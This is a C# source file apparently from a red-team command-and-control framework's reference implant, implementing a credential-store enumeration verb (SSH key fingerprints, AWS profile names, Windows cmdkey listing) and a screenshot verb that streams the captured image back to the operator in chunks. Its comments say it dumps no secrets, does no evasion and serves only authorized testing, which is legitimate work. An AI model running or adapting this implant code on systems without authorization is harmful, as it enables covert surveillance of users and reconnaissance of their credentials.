using System.Diagnostics;
using System.Globalization;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using Rod.V1;
using SysFile = System.IO.File;

namespace Rod.Implant.Internal;

// Holds the collect.* verbs the reference implant advertises (architecture.md
// Sec 10.1, ADR 0004). collect.cred enumerates standard credential stores on
// the target -- SSH key fingerprints, the names of AWS profiles, the Windows
// saved-credential listing -- and reports what it found without dumping secret
// material. collect.screenshot captures the display over the standard
// desktop-capture APIs (ScreenCapture.cs) and streams it back as a PNG
// artifact. File reads moved to the core file verbs (file.pull / file.push in
// Files.cs): upload and download are operator file transfer, not collection.
// LSASS memory dumping stays out-of-tree (ADR 0004); collect.keylog is
// contract-only and not implemented here.
//
// Argument shape:
//
//   collect.cred        [<source>]   source in {ssh, aws, cmdkey} (optional)
//   collect.screenshot  (no arguments)
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test.

internal static class Collect
{
    /// <summary>
    /// Enumerates standard credential stores on the target and reports what it
    /// found, without dumping secret material. On Linux it lists SSH keys
    /// (fingerprints only, never the private key bytes), AWS profiles (names
    /// only, the secret key presence is noted but not its value), and the
    /// Windows saved-credential listing via cmdkey /list on Windows. LSASS
    /// memory dumping is explicitly out-of-scope (ADR 0004). An optional
    /// argument filters to one source.
    /// </summary>
    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Cred(string arguments)
    {
        var source = arguments.Trim();
        if (source.Length > 0 && !IsKnownCredSource(source))
            return (TaskOutcome.Failed,
                $"collect.cred: unknown source '{source}' (expected one of ssh, aws, cmdkey)",
                Array.Empty<ExfilChunk>());

        var lines = new List<string>();
        var sources = new[] { "ssh", "aws", "cmdkey" };
        foreach (var s in sources)
        {
            if (source.Length > 0 && s != source)
                continue;
            // cmdkey is Windows-only; ssh/aws read standard profile locations on
            // either platform.
            if (s == "cmdkey" && !OperatingSystem.IsWindows())
                continue;
            lines.AddRange(CollectCredSource(s));
        }
        return lines.Count == 0
            ? (TaskOutcome.Succeeded, "(no credentials found)", Array.Empty<ExfilChunk>())
            : (TaskOutcome.Succeeded, string.Join("\n", lines), Array.Empty<ExfilChunk>());
    }

    // The size of each ExfilChunk data payload for a streamed screenshot,
    // matching the exfil and file-pull chunk sizes (512 KiB) so every
    // artifact stream crosses the wire at the same ceiling.
    private const int ChunkSize = 512 * 1024;

    /// <summary>
    /// Captures the target's display and returns it as a PNG artifact: the
    /// frame is captured over the standard desktop-capture APIs (GDI on
    /// Windows, X11 elsewhere), PNG-encoded in-process, and handed back as
    /// ExfilChunk frames the beacon streams into the engagement artifact
    /// store bound to this task (architecture.md Sec 10.1 collect, Sec 11).
    /// The output is the manifest line; the PNG is the artifact, viewable
    /// from the artifact listing and fetched by id. A host with no readable
    /// display (a headless server) reports Failed with the cause.
    /// </summary>
    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Screenshot(string arguments)
        => ScreenshotWithCapture(ScreenCapture.Capture);

    // The same verb over an injected capture, so the tests drive the whole
    // PNG-to-chunks pipeline without needing a live display.
    internal static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) ScreenshotWithCapture(
        Func<CapturedScreen> capture)
    {
        CapturedScreen screen;
        try
        {
            screen = capture();
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "collect.screenshot: " + ex.Message, Array.Empty<ExfilChunk>());
        }

        if (screen.Width <= 0 || screen.Height <= 0 || screen.Rgba.Length != screen.Width * screen.Height * 4)
            return (TaskOutcome.Failed, $"collect.screenshot: unusable frame {screen.Width}x{screen.Height}",
                Array.Empty<ExfilChunk>());

        var png = Png.EncodeRgba(screen.Width, screen.Height, screen.Rgba);
        var name = "screenshot-"
                   + DateTime.UtcNow.ToString("yyyyMMdd'T'HHmmss'Z'", CultureInfo.InvariantCulture)
                   + ".png";
        var chunks = Chunking.ChunkFile(name, "image/png", png, ChunkSize);
        return (TaskOutcome.Succeeded,
            $"captured {screen.Width}x{screen.Height} {name}: {png.Length} bytes, {chunks.Count} chunks",
            chunks);
    }

    private static bool IsKnownCredSource(string s)
        => s is "ssh" or "aws" or "cmdkey";

    // Enumerates a single credential source and returns one line per finding.
    // Each finding names the entry but never the secret.
    private static IEnumerable<string> CollectCredSource(string source)
    {
        switch (source)
        {
            case "ssh":
                return CollectSSHKeys();
            case "aws":
                return CollectAWSProfiles();
            case "cmdkey":
                // cmdkey is Windows-only; the caller filters this source off-
                // Windows, but guard the call site too so the analyzer sees the
                // platform check on the same line that reaches the Windows API.
                return OperatingSystem.IsWindows() ? CollectCmdkey() : Array.Empty<string>();
        }
        return Array.Empty<string>();
    }

    // Enumerates the per-user SSH key material under ~/.ssh. For each public
    // key it reports the SHA-256 fingerprint (computed locally; the public key
    // is, by design, not secret); for a private key with no .pub sibling it
    // reports the file name and a note. The private key bytes never leave this
    // function.
    private static IEnumerable<string> CollectSSHKeys()
    {
        var dir = SshDir();
        string[] entries;
        try
        {
            entries = Directory.GetFiles(dir);
        }
        catch (IOException)
        {
            yield break;
        }
        catch (UnauthorizedAccessException)
        {
            yield break;
        }

        foreach (var full in entries)
        {
            var name = Path.GetFileName(full);
            if (name.EndsWith(".pub", StringComparison.Ordinal))
            {
                if (SshFingerprint(full) is { Length: > 0 } fp)
                    yield return $"ssh {name} {fp}";
                continue;
            }
            // Skip the known non-key files sshd drops in ~/.ssh.
            if (name is "known_hosts" or "authorized_keys" or "config")
                continue;
            // Anything else with no .pub is a bare private key; report presence
            // without a fingerprint.
            if (!SysFile.Exists(Path.Combine(dir, name + ".pub")))
                yield return $"ssh {name} (private key, no .pub sibling)";
        }
    }

    // Computes the SHA-256 fingerprint of an OpenSSH public key file in the
    // OpenSSH form ("SHA256:base64..."). The hash is over the raw key bytes
    // (the second whitespace-separated field of the file), matching what
    // ssh-keygen -lf prints. A parse failure returns null so the caller skips.
    private static string? SshFingerprint(string path)
    {
        string body;
        try
        {
            body = SysFile.ReadAllText(path);
        }
        catch (IOException)
        {
            return null;
        }
        var fields = body.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length < 2)
            return null;
        byte[] keyBytes;
        try
        {
            keyBytes = Convert.FromBase64String(fields[1]);
        }
        catch (FormatException)
        {
            return null;
        }
        using var sha = SHA256.Create();
        var hash = sha.ComputeHash(keyBytes);
        return "SHA256:" + Convert.ToBase64String(hash).TrimEnd('=');
    }

    // Enumerates the per-user AWS profiles in ~/.aws/credentials. Each
    // [profile-name] header becomes one line; the secret access key is NOT
    // reported -- only the profile name and whether a secret is present.
    private static IEnumerable<string> CollectAWSProfiles()
    {
        var path = AwsCredentialsPath();
        string body;
        try
        {
            body = SysFile.ReadAllText(path);
        }
        catch (IOException)
        {
            yield break;
        }
        catch (UnauthorizedAccessException)
        {
            yield break;
        }

        string? current = null;
        var sawSecret = false;
        foreach (var raw in body.Split('\n'))
        {
            var line = raw.Trim();
            if (line.Length == 0 || line.StartsWith("#", StringComparison.Ordinal))
                continue;
            if (line.StartsWith("[", StringComparison.Ordinal) && line.EndsWith("]", StringComparison.Ordinal))
            {
                if (current is { Length: > 0 } name)
                    yield return FormatAWSProfile(name, sawSecret);
                current = line.Substring(1, line.Length - 2);
                sawSecret = false;
                continue;
            }
            if (line.StartsWith("aws_secret_access_key", StringComparison.OrdinalIgnoreCase))
                sawSecret = true;
        }
        if (current is { Length: > 0 } last)
            yield return FormatAWSProfile(last, sawSecret);
    }

    private static string FormatAWSProfile(string name, bool sawSecret)
        => sawSecret ? $"aws {name} (secret in file)" : $"aws {name} (no secret in file)";

    // Runs the documented Windows `cmdkey /list` command, which itself only
    // lists saved-credential target names (it does not print passwords). The
    // output is returned line for line, prefixed "cmdkey ".
    [SupportedOSPlatform("windows")]
    private static IEnumerable<string> CollectCmdkey()
    {
        var (outcome, output) = RunCaptured("cmdkey", "/list");
        if (outcome == TaskOutcome.Failed)
        {
            yield return $"cmdkey (listing failed: {output})";
            yield break;
        }
        foreach (var line in output.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            var trimmed = line.Trim();
            if (trimmed.Length > 0)
                yield return "cmdkey " + trimmed;
        }
    }

    private static string SshDir()
        => Path.Combine(HomeDir(), ".ssh");

    private static string AwsCredentialsPath()
        => Path.Combine(HomeDir(), ".aws", "credentials");

    // Resolves the current user's home directory. On Linux/macOS $HOME is
    // authoritative (matching standard Unix tooling); on Windows %USERPROFILE% is. Falls back to
    // Environment.GetFolderPath when the variable is unset.
    private static string HomeDir()
    {
        if (OperatingSystem.IsWindows())
        {
            var profile = Environment.GetEnvironmentVariable("USERPROFILE");
            if (!string.IsNullOrEmpty(profile))
                return profile;
        }
        else
        {
            var home = Environment.GetEnvironmentVariable("HOME");
            if (!string.IsNullOrEmpty(home))
                return home;
        }
        return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
    }

    // Runs a platform command, capturing combined stdout/stderr. A non-zero
    // exit is Failed with the output captured so the operator sees the cause.
    private static (TaskOutcome Outcome, string Output) RunCaptured(string fileName, string arguments)
    {
        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        try
        {
            using var process = Process.Start(psi);
            if (process is null)
                return (TaskOutcome.Failed, $"failed to start {fileName}");
            var stdout = process.StandardOutput.ReadToEnd();
            var stderr = process.StandardError.ReadToEnd();
            process.WaitForExit();
            if (stdout.Length == 0)
                return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stderr);
            if (stderr.Length == 0)
                return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stdout);
            return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stdout + "\n" + stderr);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }
    }
}
